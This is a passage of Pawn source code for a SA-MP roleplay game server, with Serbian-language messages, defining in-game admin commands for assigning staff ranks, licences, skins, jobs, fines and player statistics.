			PlayerInfo[ id ][ xSpawn ] = SetRandomSpawn(  );
			PostaviSkin( id, SetSexSkin( id ) );
			
			SavePlayer( id );

			Novi_SetPlayerArmour( id, 0 );
			AdminDuty[ id ] = false;

			SendClientMessageEx( id, SVETLOPLAVA, " Admin %s vam je skinuo Admin poziciju.",ImeIgraca( playerid ) );
			SendClientMessageEx( playerid, SVETLOPLAVA, " Skinuli ste igracu: %s Admin poziciju.",ImeIgraca( id ) );

			new string[ 128 ];
			format( string, sizeof( string ), "Admin %s | Igrac: %s | Level Admin: %d", ImeIgraca( playerid ), ImeIgraca( id ), kolicina );
			LogSave( "Ostalo/LogMakeAdmin.log", string );

	        format( globalstring, sizeof( globalstring ), "MAKE | %s je skinuo Admin-a igracu %s.", ImeIgraca( playerid ), ImeIgraca( id ) );
		   	AdminPoruka( NARACRVENA, globalstring );
		}
		else if( kolicina == 1 || kolicina == 2 || kolicina == 3 || kolicina == 4 || kolicina == 5 || kolicina == 6 || kolicina == 7 ) {

			// if( kolicina == 5 || kolicina == 6 || kolicina == 7 ) {
			//     if( !IsPlayerAdmin( playerid ) ) return SendErrorMessage( playerid, "Moras biti rcon admin." );
			// }

			new randkod = 10000 + random(89999);
            PlayerInfo[ id ][ xAdminDuty ] = 0;
			PlayerInfo[ id ][ xAKod ] = randkod;
			PlayerInfo[ id ][ xAdmin ] = kolicina;
            PlayerInfo[ id ][ xAdminWarn ] = 0; 
			SavePlayer( id );
			SacuvajAdmina( id );
			SendClientMessageEx( id, SVETLOPLAVA, "Vlasnik %s vam je postavio Admin poziciju(level: %d).",ImeIgraca( playerid ) , kolicina );
			SendClientMessageEx( playerid, SVETLOPLAVA, "Postavili ste igracu: %s Admin poziciju(level: %d).",ImeIgraca( id ) , kolicina );

			new string[ 128 ];
			format( string, sizeof( string ), "Admin %s | Igrac: %s | Level Admin-a: %d", ImeIgraca( playerid ), ImeIgraca( id ), kolicina );
			LogSave( "Ostalo/LogMakeAdmin.log", string );

	        format( globalstring, sizeof( globalstring ), "MAKE | %s je dao Admin level %d igracu %s.", ImeIgraca( playerid ), kolicina, ImeIgraca( id ) );
		   	AdminPoruka( NARACRVENA, globalstring );
		   	
		} else return SendErrorMessage( playerid, "Pogresan level Admin-a.( 0, 1, 2, 3, 4, 5, 6, 7 )" );
		
	} else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");
	return 1;
}

alias:makepromoter("postavipromotera");
CMD:makepromoter( playerid, params[] ) {

    if( PlayerInfo[ playerid ][ xAdmin ] > 3 || PlayerInfo[ playerid ][ xSkriptaRank ] == 5  ) {

		new id, kolicina;
	    if( sscanf( params, "ui", id, kolicina ) ) {
			SendUsageMessage( playerid, "/makepromoter [ ID/Deo imena ][ 0-1 ]");
			return 1;
		}
		if( id == IPI ) return SendErrorMessage( playerid, "Taj igrac nije na serveru.");
        if(PlayerInfo[id][xAdmin] >= 1 && kolicina != 0) return SendErrorMessage(playerid, "Ne mozes to adminu!");
        if(PlayerInfo[id][xSpecAdmin] >= 1 && kolicina != 0) return SendErrorMessage(playerid, "Ne mozes to spec adminu!");
        if(PlayerInfo[id][xVIPLevel] >= 1 && kolicina != 0) return SendErrorMessage(playerid, "Ne mozes to vipu!");
        if(PlayerInfo[id][xSupporter] >= 1 && kolicina != 0) return SendErrorMessage(playerid, "Ne mozes to helperu!");
		if( kolicina == 0 ) {
		
		    SetPlayerColor( id, 0xFFFFFF00 );
	 		PlayerInfo[ id ][ xPromoter ] = 0; SavePlayer( id );
			SendClientMessageEx( id, SVETLOPLAVA, " Admin %s vam je skinuo promoter poziciju.", ImeIgraca( playerid ) );
			SendClientMessageEx( playerid, SVETLOPLAVA, " Skinuli ste igracu: %s promoter poziciju.", ImeIgraca( id ) );

	        format( globalstring, sizeof( globalstring ), "MAKE | %s je skinuo promoter poziciju igracu %s.", ImeIgraca( playerid ), ImeIgraca( id ) );
		   	AdminPoruka( NARACRVENA, globalstring );
		}
		else if( kolicina == 1 ) {
		
			PlayerInfo[ id ][ xPromoter ] = 1; SavePlayer( id );
			SendClientMessageEx( id, SVETLOPLAVA, "Admin %s vam je postavio promoter poziciju.",ImeIgraca( playerid ) );
			SendClientMessageEx( playerid, SVETLOPLAVA, "Postavili ste igracu: %s promoter poziciju",ImeIgraca( id ) );

	        format( globalstring, sizeof( globalstring ), "MAKE | %s je dao promoter poziciju igracu %s.", ImeIgraca( playerid ), ImeIgraca( id ) );
		   	AdminPoruka( NARACRVENA, globalstring );
		}
		else return SendErrorMessage( playerid, "Pogresan level promotera.( 0 - 1 )" );
		
	} else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

alias:makehelper("postavihelpera");
CMD:makehelper( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin] > 5 || PlayerInfo[ playerid ][ xSupporter ] > 3 || PlayerInfo[playerid][xSkriptaRank] == 7) {
        if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
    	new id, kolicina;
        if( sscanf( params, "ui", id, kolicina ) ) {
    		SendUsageMessage( playerid, "/makehelper [ ID/Deo imena ][ Level Helpera ]");
    		return 1;
    	}
    	if( id == IPI ) return SendErrorMessage( playerid, "Taj igrac nije na serveru.");
        if(PlayerInfo[id][xAdmin] >= 1 && kolicina != 0) return SendErrorMessage(playerid, "Ne mozes to adminu!");
        if(PlayerInfo[id][xSpecAdmin] >= 1 && kolicina != 0) return SendErrorMessage(playerid, "Ne mozes to spec adminu!");
        if(PlayerInfo[id][xVIPLevel] >= 1 && kolicina != 0) return SendErrorMessage(playerid, "Ne mozes to vipu!");
        if(PlayerInfo[id][xPromoter] >= 1 && kolicina != 0) return SendErrorMessage(playerid, "Ne mozes to promoteru!");
        if(PlayerInfo[id][xLider] >= 1 && kolicina != 0) return SendErrorMessage(playerid, "Ne mozes to lideru!");
    	if( kolicina == 0) {
    	    SetPlayerColor( id, 0xFFFFFF00 );
    	    ResetujAdmina( id ); SacuvajAdmina( id );
    	    
     		PlayerInfo[ id ][ xSupporter ] = 0;
            PlayerInfo[ id ][ xAdminDuty ] = 0;
            PlayerInfo[ id ][ xSkin ] = SetSexSkin( id );
    		PlayerInfo[ id ][ xSpawn ] = SetRandomSpawn(  );
    		PostaviSkin( id, SetSexSkin( id ) );
    		
    		SavePlayer( id );
    		
    		Novi_SetPlayerArmour( id, 0 );
    		AdminDuty[ id ] = false;

    		SendClientMessageEx( id, SVETLOPLAVA, " Admin %s vam je skinuo Helper poziciju.",ImeIgraca( playerid ) );
    		SendClientMessageEx( playerid, SVETLOPLAVA, " Skinuli ste igracu: %s Helper poziciju.",ImeIgraca( id ) );

    		new string[ 128 ]; 
    		format( string, sizeof( string ), "Admin %s | Igrac: %s | Level Helpera: %d", ImeIgraca( playerid ), ImeIgraca( id ), kolicina );
    		LogSave( "Ostalo/LogMakeSage.log", string );

            format( globalstring, sizeof( globalstring ), "MAKE | %s je skinuo poziciju Helpera igracu %s.", ImeIgraca( playerid ), ImeIgraca( id ) );
    	   	AdminPoruka( NARACRVENA, globalstring );
    	}
    	else if( kolicina == 1 || kolicina == 2 ) {
    	
    		PlayerInfo[ id ][ xSupporter ] = kolicina; PlayerInfo[ id ][ xAdminDuty ] = 0; SavePlayer( id ); SacuvajAdmina( id );
    		SendClientMessageEx( id, SVETLOPLAVA, "Admin %s vam je postavio Helper poziciju(level: %d).",ImeIgraca( playerid ) , kolicina );
    		SendClientMessageEx( playerid, SVETLOPLAVA, "Postavili ste igracu: %s Helper poziciju(level: %d).",ImeIgraca( id ) , kolicina );

    		new string[ 128 ]; 
    		format( string, sizeof( string ), "Admin %s | Igrac: %s | Level Helpera: %d", ImeIgraca( playerid ), ImeIgraca( id ), kolicina );
    		LogSave( "Ostalo/LogMakeSage.log", string );

            format( globalstring, sizeof( globalstring ), "MAKE | %s je dao Helpera level %d igracu %s.", ImeIgraca( playerid ), kolicina, ImeIgraca( id ) );
    	   	AdminPoruka( NARACRVENA, globalstring );
    	}
    	else if( kolicina == 3 ) {
    	    if( PlayerInfo[ playerid ][ xAdmin ] < 5 || PlayerInfo[playerid][xSkriptaRank] != 7) return SendErrorMessage( playerid, "Head Helpera moze dati samo head admin." );
    	    PlayerInfo[ id ][ xSupporter ] = kolicina; PlayerInfo[ id ][ xAdminDuty ] = 0; SavePlayer( id ); SacuvajAdmina( id );
    		SendClientMessageEx( id, SVETLOPLAVA, "Admin %s vam je postavio Head Helpera poziciju.", ImeIgraca( playerid ) );
    		SendClientMessageEx( playerid, SVETLOPLAVA, "Postavili ste igracu: %s Head Helpera poziciju.", ImeIgraca( id ) );

    		new string[ 128 ]; 
    		format( string, sizeof( string ), "Admin %s | Igrac: %s | Level Helpera: Head", ImeIgraca( playerid ), ImeIgraca( id ) );
    		LogSave( "Ostalo/LogMakeSage.log", string );

            format( globalstring, sizeof( globalstring ), "MAKE | %s je dao poziciju head Helpera igracu %s.", ImeIgraca( playerid ), ImeIgraca( id ) );
    	   	AdminPoruka( NARACRVENA, globalstring );
    	}
    	else return SendErrorMessage( playerid, "Pogresan level gsa.( 0, 1, 2, 3 )" );
    } else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:promenipol( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] < 6 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");
    if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
	new id, kolicina;
	if( sscanf( params, "ui", id, kolicina ) ) {
	    SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
		SendUsageMessage( playerid, "/promenipol [ ID/Deo imena ] [ pol ]");
     	SCM( playerid, BELA, "[Polovi] 1. Muski pol | 2. Zenski pol");
     	SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
     	return 1;
	}
	if( kolicina == 1 ) {
	    PlayerInfo[ id ][ xPol ] = 1;
	    PlayerInfo[ id ][ xSkin ] = SetSexSkin( id );
     	SendClientMessageEx( playerid, SVETLOPLAVA, "Promenili ste igracu %s spol na musko.", ImeIgraca( id ) );
     	return 1;
	}
	else if( kolicina == 2 ) {
	    PlayerInfo[ id ][ xPol ] = 2;
	    PlayerInfo[ id ][ xSkin ] = SetSexSkin( id );
     	SendClientMessageEx( playerid, SVETLOPLAVA, "Promenili ste igracu %s spol na zensko.", ImeIgraca( id ) );
     	return 1;
	}
	else {
	    SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
		SendUsageMessage( playerid, "/promenipol [ ID/Deo imena ] [ pol ]");
     	SCM( playerid, BELA, "[Polovi] 1. Muski pol | 2. Zenski pol");
     	SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
	}
	return 1;
}

// CMD:sveskole( playerid, params[] ) {

// 	if( PlayerInfo[ playerid ][ xAdmin ] < 6 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");
//     if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );

//     new id;
// 	if( sscanf( params, "u", id ) ) {
// 	    SendUsageMessage( playerid, "/sveskole [ ID/Deo imena ]");
// 	    return 1;
// 	}
// 	if( id == IPI ) return SendErrorMessage( playerid, "Taj igrac nije na serveru." );
	
// 	PlayerInfo[ id ][ xOsnovna ] = 3;
// 	PlayerInfo[ id ][ xSrednja ] = 6;
// 	PlayerInfo[ id ][ xFakultet ] = 15;

// 	SavePlayer( id );
	
// 	SendInfoMessage( playerid, "Dali ste sve skole %s.", ImeIgraca( id ) );
// 	SendInfoMessage( id, "Admin %s vam je postavio sve skole.", ImeIgraca( playerid ) );
//     return 1;
// }

alias:adajdozvolu("givelicense", "dajdozvolu", "agivelicense");
CMD:adajdozvolu( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] < 6 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");
    if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );

	new item[ 32 ], id;
	if( sscanf( params, "s[32]u", item, id ) ) {
		SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
		SendUsageMessage( playerid, "/adajdozvolu [kategorija] [ ID/Deo imena ]");
     	SCM( playerid, BELA, "[Kategorije] A(motor), B(auto), C1(Kombi), C2(Kamion), C3(Kamion sa prikolicom)");
     	SCM( playerid, BELA, "[Kategorije] D(brod), F(letelica), oruzje");
        SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
		return 1;
	}
	if( id == IPI ) return SendErrorMessage( playerid, "Pogresan ID." );
	if( strcmp( item, "a", true ) == 0 ) {
		PlayerInfo[ id ][ xMotorska ] = 1;
		SendInfoMessage( playerid, "Dali ste dozvolu za A kategoriju igracu %s.", ImeIgraca( id ) );
		SendInfoMessage( id, "Admin %s vam je dao dozvolu za A kategoriju.", ImeIgraca( playerid ) );
	}
	else if( strcmp( item, "b", true ) == 0 ) {
		PlayerInfo[ id ][ xVozacka ] = 1;
		SendInfoMessage( playerid, "Dali ste dozvolu za B kategoriju igracu %s.", ImeIgraca( id ) );
		SendInfoMessage( id, "Admin %s vam je dao dozvolu za B kategoriju.", ImeIgraca( playerid ) );
	}
	else if( strcmp( item, "c1", true ) == 0 ) {
		PlayerInfo[ id ][ xKamionskaC1 ] = 1;
		SendInfoMessage( playerid, "Dali ste dozvolu za C1 kategoriju igracu %s.", ImeIgraca( id ) );
		SendInfoMessage( id, "Admin %s vam je dao dozvolu za C1 kategoriju.", ImeIgraca( playerid ) );
	}
	else if( strcmp( item, "c2", true ) == 0 ) {
		PlayerInfo[ id ][ xKamionskaC2 ] = 1;
		SendInfoMessage( playerid, "Dali ste dozvolu za C2 kategoriju igracu %s.", ImeIgraca( id ) );
		SendInfoMessage( id, "Admin %s vam je dao dozvolu za C2 kategoriju.", ImeIgraca( playerid ) );
	}
	else if( strcmp( item, "c3", true ) == 0 ) {
		PlayerInfo[ id ][ xKamionskaC3 ] = 1;
		SendInfoMessage( playerid, "Dali ste dozvolu za C3 kategoriju igracu %s.", ImeIgraca( id ) );
		SendInfoMessage( id, "Admin %s vam je dao dozvolu za C3 kategoriju.", ImeIgraca( playerid ) );
	}
	else if( strcmp( item, "d", true ) == 0 ) {
		PlayerInfo[ id ][ xBrodska ] = 1;
		SendInfoMessage( playerid, "Dali ste dozvolu za D kategoriju igracu %s.", ImeIgraca( id ) );
		SendInfoMessage( id, "Admin %s vam je dao dozvolu za D kategoriju.", ImeIgraca( playerid ) );
	}
	else if( strcmp( item, "f", true ) == 0 ) {
		PlayerInfo[ id ][ xLetelica ] = 1;
		SendInfoMessage( playerid, "Dali ste dozvolu za F kategoriju igracu %s.", ImeIgraca( id ) );
		SendInfoMessage( id, "Admin %s vam je dao dozvolu za F kategoriju.", ImeIgraca( playerid ) );
	}
	else if( strcmp( item, "oruzje", true ) == 0 ) {
		PlayerInfo[ id ][ xGunLicense ] = true;
		SendInfoMessage( playerid, "Dali ste dozvolu za oruzje igracu %s.", ImeIgraca( id ) );
		SendInfoMessage( id, "Admin %s vam je dao dozvolu za oruzje.", ImeIgraca( playerid ) );
	}
	else {
	    SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
		SendUsageMessage( playerid, "/adajdozvolu [kategorija] [ID/Ime igraca] [Cena]");
     	SCM( playerid, BELA, "[Kategorije] A(motor), B(auto), C1(Kombi), C2(Kamion), C3(Kamion sa prikolicom)");
     	SCM( playerid, BELA, "[Kategorije] D(brod), F(letelica), oruzje");
        SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
	}
	return 1;
}

CMD:platiorgkaznu(playerid) {

    if(PlayerInfo[playerid][xKazneniUgovor] == 0) return SendErrorMessage(playerid, "Igrac nema org kaznu!");
    if(!IsPlayerInRangeOfPoint(playerid, 2.0, -1872.6609,2670.5059,3.5904)) return SendErrorMessage(playerid, "Moras biti u opstini!");

    if(GetPlayerMoney(playerid) < 50000) return SendErrorMessage(playerid, "Nemas dovoljno novca ( 50.000$ ).");

    DajIgracuNovac(playerid, -50000);
    PlayerInfo[playerid][xKazneniUgovor] = 0;
    SavePlayer(playerid);

    SendInfoMessage(playerid, "Uspesno si platio 50.000$ i skinuo org kaznu!");

    return 1;
}

CMD:skiniorgkaznu( playerid, params[] ) {

    if( PlayerInfo[ playerid ][ xAdmin ] > 5 || PlayerInfo[ playerid ][ xSkriptaRank ] == 4  ) {

	    if( PlayerInfo[ playerid ][ xAdmin ] < 5 ) { if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" ); }
		new id;
		if( sscanf( params, "u", id ) ) {
		    SendUsageMessage( playerid, "/skiniorgkaznu [ ID/Deo imena ]");
		    return 1;
		}
		if( id == IPI ) return SendErrorMessage( playerid, "Taj igrac nije na serveru." );
        if(PlayerInfo[id][xKazneniUgovor] == 0) return SendErrorMessage(playerid, "Igrac nema org kaznu!");
		PlayerInfo[ id ][ xKazneniUgovor ] = 0;
		SavePlayer( id );
		SendClientMessageEx( id, SVETLOPLAVA, "Admin %s vam je skinuo org kaznu.",ImeIgraca( playerid ) );
		SendClientMessageEx( playerid, SVETLOPLAVA, " Skinuli ste igracu: %s org kaznu.", ImeIgraca( id ) );
	} else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");
    return true;
}

CMD:setskin( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] < 1 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");
    if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
	new id, kolicina;
	if( sscanf( params, "ui", id, kolicina ) ) {
	    SendUsageMessage( playerid, "/setskin [ ID/Deo imena ] [ id skin ]");
	    return 1;
	}
	if( id == IPI ) return SendErrorMessage( playerid, "Taj igrac nije na serveru." );
	if( kolicina < 1 || kolicina > 311 ) return SendErrorMessage( playerid, "Broj skina ide od 1 do 311." );
	PlayerInfo[ id ][ xSkin ] = kolicina; SavePlayer( id ); PostaviSkin( id, kolicina );
	
    SendClientMessageEx( id, SVETLOPLAVA, "Admin %s vam je postavio skin ID: %d.",ImeIgraca( playerid ), kolicina );
	SendClientMessageEx( playerid, SVETLOPLAVA, " Postavili ste igracu: %s skind ID: %d.", ImeIgraca( id ), kolicina );
	return true;
}

alias:setjob("postaviposao");
CMD:setjob( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] < 5 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");
    if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
	new id;
	if( sscanf( params, "u", id ) ) {
	    SendUsageMessage( playerid, "/setjob [ ID/Deo imena ]");
	    return 1;
	}
	if( id == IPI ) return SendErrorMessage( playerid, "Taj igrac nije na serveru." );
	
	OdabraniIgracPosao[playerid] = id;

    new string[128], BigString[2000];
    for(new job = 0; job < MAX_JOBS; job++) {

        format(string, sizeof(string), "%s\n", jobsInfos[job][jName]);
        strcat(BigString, string);
    }
    ShowPlayerDialog(playerid, dialog_SelectJob, DIALOG_STYLE_LIST, "Odaberite Posao", BigString, "Odaberi", "Odustani");
	return true;
}

CMD:ubaciprodukte( playerid, params[] ) {

    if( PlayerInfo[ playerid ][ xAdmin ] < 6 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");
    if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );

	new id, kolicina, File[ 50 ];
	if( sscanf( params, "ui", id, kolicina ) ) return SendUsageMessage( playerid, "/ubaciprodukte [ ID firme ] [ kolicina ]");

	format( File, sizeof( File ), F_FILE, id );
	if( !fexist( File ) ) return SendErrorMessage( playerid, "Ta firma(ID) ne postoji u bazi podataka!");
	
	BussinesInfo[ id ][ bProducts ] += kolicina;
	SaveBussines( id );
	
	SendInfoMessage( playerid, "Postavili ste %d produkta u firmu ID %d.", kolicina, id );
	return true;
}

alias:setstat("setstats");
CMD:setstat( playerid, params[] ) {

    if( PlayerInfo[ playerid ][ xAdmin ] < 6 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");
    if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
	new odabir[20], id, kolicina, string1[ 128 ];
	if( sscanf( params, "us[20]i", id, odabir, kolicina ) ) {
		SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
		SendUsageMessage( playerid, "/setstat [ ID/Deo imena ] [ opcija ] [ kolicina ]");
     	SCM( playerid, BELA, "[Opcije] level, skin, pol, godine, posao, firma");
     	SCM( playerid, BELA, "[Opcije] respekt, vozilo1, vozilo2, vozilo3, vozilo4, licna, pasos");
     	SCM( playerid, BELA, "[Opcije] imovina1, imovina2, imovina3, brojtelefona, garaza");
        SCM( playerid, BELA, "[Opcije] btcworkshop, radionica, platforma, mats");
		SCM( playerid, CRVENA, "Da bi igrac bio bez vozila,imovine,firme kljuc trebate staviti na -1");
		SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
		return 1;
	}
    else if(strcmp(odabir,"platforma",true) == 0) {
        if( PlayerInfo[ playerid ][ xAdmin ] < 6) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
        if( id == IPI ) return SendErrorMessage( playerid, "Taj igrac nije na serveru.");
        if( kolicina == -1 ) {
            PlayerInfo[ id ][ xNaftaID ] = kolicina; SavePlayer( id );
            SendClientMessageEx( id, SVETLOPLAVA, " Admin %s vam je postavio kljuc Naftne Platforme: %d.", ImeIgraca( playerid ), kolicina );
            SendClientMessageEx( playerid, SVETLOPLAVA, " Postavili ste igracu: %s kljuc Naftne Platforme: %d.", ImeIgraca( id ), kolicina );
            format( string1, sizeof( string1 ), "Admin %s je skinuo kljuc Naftne Platforme igracu %s.", ImeIgraca( playerid ), ImeIgraca( id ) );
        }
        else {
            new ImaFajl[ 50 ];
            format( ImaFajl, sizeof( ImaFajl ), PLATFORMA_FILE, kolicina );
            if( !fexist( ImaFajl ) ) return SendErrorMessage( playerid, "Ta Naftna Platforma ne postoji." );

            SendClientMessageEx( id, SVETLOPLAVA, " Admin %s vam je postavio kljuc Naftne Platforme: %d.", ImeIgraca( playerid ), kolicina );
            SendClientMessageEx( playerid, SVETLOPLAVA, " Postavili ste igracu: %s kljuc Naftne Platforme: %d.", ImeIgraca( id ), kolicina );
            PlayerInfo[ id ][ xNaftaID ] = kolicina;
            SavePlayer( id );

            strmid( NaftaInfo[ kolicina ][ pVlasnik ], ImeIgraca( id ), 0, strlen( ImeIgraca( id ) ), MAX_PLAYER_NAME );

            SacuvajNaftnuPlatformu(kolicina);
            NaftaLabelUpdate(kolicina);

            format( string1, sizeof( string1 ), "Admin %s je postavio kljuc Naftne Platforme na %d igracu %s.", ImeIgraca( playerid ), kolicina, ImeIgraca( id ) );
        }
    }
    else if(strcmp(odabir,"btcworkshop",true) == 0) {
        if( PlayerInfo[ playerid ][ xAdmin ] < 6) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
        if( id == IPI ) return SendErrorMessage( playerid, "Taj igrac nije na serveru.");
        if( kolicina == -1 ) {
            PlayerInfo[ id ][ xWorkShopID ] = kolicina; SavePlayer( id );
            SendClientMessageEx( id, SVETLOPLAVA, " Admin %s vam je postavio kljuc Bitcoin Workshopa: %d.", ImeIgraca( playerid ), kolicina );
            SendClientMessageEx( playerid, SVETLOPLAVA, " Postavili ste igracu: %s kljuc Bitcoin Workshopa: %d.", ImeIgraca( id ), kolicina );
            format( string1, sizeof( string1 ), "Admin %s je skinuo kljuc Bitcoin Workshopa igracu %s.", ImeIgraca( playerid ), ImeIgraca( id ) );
        }
        else {
            new ImaFajl[ 50 ];
            format( ImaFajl, sizeof( ImaFajl ), BITCOIN_FILE, kolicina );
            if( !fexist( ImaFajl ) ) return SendErrorMessage( playerid, "Taj Bitcoin Workshop ne postoji." );

            SendClientMessageEx( id, SVETLOPLAVA, " Admin %s vam je postavio kljuc Bitcoin Workshopa: %d.", ImeIgraca( playerid ), kolicina );
            SendClientMessageEx( playerid, SVETLOPLAVA, " Postavili ste igracu: %s kljuc Bitcoin Workshopa: %d.", ImeIgraca( id ), kolicina );
            PlayerInfo[ id ][ xWorkShopID ] = kolicina;
            SavePlayer( id );

            strmid( BitcoinInfo[ kolicina ][ bVlasnik ], ImeIgraca( id ), 0, strlen( ImeIgraca( id ) ), MAX_PLAYER_NAME );

            SacuvajBTCWorkShop(kolicina);
            BitCoinLP(kolicina);

            format( string1, sizeof( string1 ), "Admin %s je postavio kljuc Bitcoin Workshopa na %d igracu %s.", ImeIgraca( playerid ), kolicina, ImeIgraca( id ) );
        }
    }
    else if(strcmp(odabir,"radionica",true) == 0) {
        if( PlayerInfo[ playerid ][ xAdmin ] < 6) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
        if( id == IPI ) return SendErrorMessage( playerid, "Taj igrac nije na serveru.");
        if( kolicina == -1 ) {
            PlayerInfo[ id ][ xWorkShopGarage ] = kolicina; SavePlayer( id );
            SendClientMessageEx( id, SVETLOPLAVA, " Admin %s vam je postavio kljuc radionice: %d.", ImeIgraca( playerid ), kolicina );
            SendClientMessageEx( playerid, SVETLOPLAVA, " Postavili ste igracu: %s kljuc radionice: %d.", ImeIgraca( id ), kolicina );
            format( string1, sizeof( string1 ), "Admin %s je skinuo kljuc radionice igracu %s.", ImeIgraca( playerid ), ImeIgraca( id ) );
        }
        else {
            new ImaFajl[ 50 ];
            format( ImaFajl, sizeof( ImaFajl ), WorkShop_File, kolicina );
            if( !fexist( ImaFajl ) ) return SendErrorMessage( playerid, "Ta radionica ne postoji." );

            SendClientMessageEx( id, SVETLOPLAVA, " Admin %s vam je postavio kljuc radionice: %d.", ImeIgraca( playerid ), kolicina );
            SendClientMessageEx( playerid, SVETLOPLAVA, " Postavili ste igracu: %s kljuc radionice: %d.", ImeIgraca( id ), kolicina );
            PlayerInfo[ id ][ xWorkShopGarage ] = kolicina;
            SavePlayer( id );

            strmid( WorkShopInfo[ kolicina ][ wVlasnik ], ImeIgraca( id ), 0, strlen( ImeIgraca( id ) ), MAX_PLAYER_NAME );

            SaveWorkShop(kolicina);
            WorkShopVehicleCheck(kolicina);
            WorkShopLabelUpdate(kolicina);

            format( string1, sizeof( string1 ), "Admin %s je postavio kljuc radionice na %d igracu %s.", ImeIgraca( playerid ), kolicina, ImeIgraca( id ) );
        }
    }
	else if( strcmp( odabir, "level", true ) == 0 )
	{
		if( PlayerInfo[ playerid ][ xAdmin ] < 6) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
		if( id == IPI ) return SendErrorMessage( playerid, "Taj igrac nije na serveru.");

        new oldLvl = PlayerInfo[id][xLevel];
        if(oldLvl < kolicina)
            dajSkillPoen(id, kolicina - oldLvl);

   		PlayerInfo[ id ][ xLevel ] = kolicina; SavePlayer( id ); SetPlayerScore( id, kolicina );
        SendClientMessageEx( id, SVETLOPLAVA, " Admin %s vam je postavio level: %d.",ImeIgraca( playerid ) , kolicina );
		SendClientMessageEx( playerid, SVETLOPLAVA, " Postavili ste igracu: %s level: %d.",ImeIgraca( id ) , kolicina );
		format( string1, sizeof( string1 ), "Admin %s je postavio level %d igracu %s.", ImeIgraca( playerid ), kolicina, ImeIgraca( id ) );
	}
	else if( strcmp( odabir, "brojtelefona", true ) == 0 ) {
	
		if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
		if( id == IPI ) return SendErrorMessage( playerid, "Taj igrac nije na serveru.");
		if( kolicina < 100 || kolicina > 99999999 ) return SendErrorMessage( playerid, "Broj moze ici od 100 do 99999999(3-8 cifara)!" );
		PlayerInfo[ id ][ xBrojTelefona ] = kolicina; SavePlayer( id );
        SendClientMessageEx( id, SVETLOPLAVA, " Admin %s vam je postavio broj telefona: %d.",ImeIgraca( playerid ) , kolicina );
		SendClientMessageEx( playerid, SVETLOPLAVA, " Postavili ste igracu: %s broj telefona: %d.",ImeIgraca( id ) , kolicina );
        format( string1, sizeof( string1 ), "Admin %s je postavio broj telefona %d igracu %s.", ImeIgraca( playerid ), kolicina, ImeIgraca( id ) );
	}

    else if(strcmp(odabir,"licna",true) == 0)
    {
        if( PlayerInfo[ playerid ][ xAdmin ] < 6) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
        if( id == IPI ) return SendErrorMessage( playerid, "Taj igrac nije na serveru.");
        if(PlayerInfo[id][xLicnaKarta] == 1) return SendErrorMessage(playerid, "Igrac vec ima licnu kartu!");
        PlayerInfo[ id ][ xLicnaKarta ] = 1; SavePlayer( id );
        
        SendClientMessageEx( id, SVETLOPLAVA, " Admin %s vam je postavio licnu kartu!",ImeIgraca( playerid ));
        SendClientMessageEx( playerid, SVETLOPLAVA, " Postavili ste igracu %s licnu kartu!", ImeIgraca( id ));
        format( string1, sizeof( string1 ), "Admin %s je postavio licnu kartu igracu %s.", ImeIgraca( playerid ), ImeIgraca( id ) );
    }
    else if(strcmp(odabir,"pasos",true) == 0)
    {
        if( PlayerInfo[ playerid ][ xAdmin ] < 6) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
        if( id == IPI ) return SendErrorMessage( playerid, "Taj igrac nije na serveru.");
